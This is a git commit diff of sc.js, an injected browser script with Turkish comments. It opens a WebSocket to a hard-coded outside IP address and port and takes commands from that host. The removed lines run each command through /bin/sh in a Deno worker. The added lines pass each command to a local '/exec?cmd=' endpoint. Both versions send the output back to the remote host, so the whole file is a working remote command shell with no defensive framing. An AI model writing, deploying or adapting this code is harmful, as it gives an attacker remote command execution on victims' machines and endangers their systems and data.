9ca77d6548374185c74814cd79b8825b0269c415
isimsiz <75686345+isimsizbirii@users.noreply.github.com>
2024-03-19 12:07:38 +0300

    Update sc.js

--- sc.js
+++ sc.js
@@ -1,30 +1,22 @@
 <script>
-    var port = 4545; // Bağlantı kurulacak port numarası
-    var host = '31.172.87.6'; // Bağlantı kurulacak IP adresi
+var host = '31.172.87.6'; // Bağlanılacak IP adresi
+var port = 4545; // Bağlanılacak port numarası
 
-    var s = new WebSocket('ws://' + host + ':' + port);
+var s = new WebSocket('ws://' + host + ':' + port);
 
-    s.onopen = function () {
-        s.send('Bağlantı başarılı. Merhaba!');
+s.onopen = function () {
+    s.send('Bağlantı başarılı. Merhaba!');
+};
+
+s.onmessage = function (e) {
+    var command = e.data;
+    var xhr = new XMLHttpRequest();
+    xhr.open("GET", "/exec?cmd=" + encodeURIComponent(command), true);
+    xhr.onreadystatechange = function() {
+        if (xhr.readyState == 4 && xhr.status == 200) {
+            s.send(xhr.responseText);
+        }
     };
-
-    s.onmessage = function (e) {
-        var command = e.data;
-        var child = new Worker(URL.createObjectURL(new Blob([`
-            var cmd = '` + command + `';
-            var p = Deno.run({
-                cmd: ['/bin/sh', '-c', cmd],
-                stdout: 'piped',
-                stderr: 'piped',
-                stdin: 'piped'
-            });
-            var stdout = new TextDecoder().decode(await p.output());
-            var stderr = new TextDecoder().decode(await p.stderrOutput());
-            var output = stdout + '\\n' + stderr;
-            postMessage(output);
-        `])));
-        child.onmessage = function (e) {
-            s.send(e.data);
-        };
-    };
+    xhr.send();
+};
 </script>
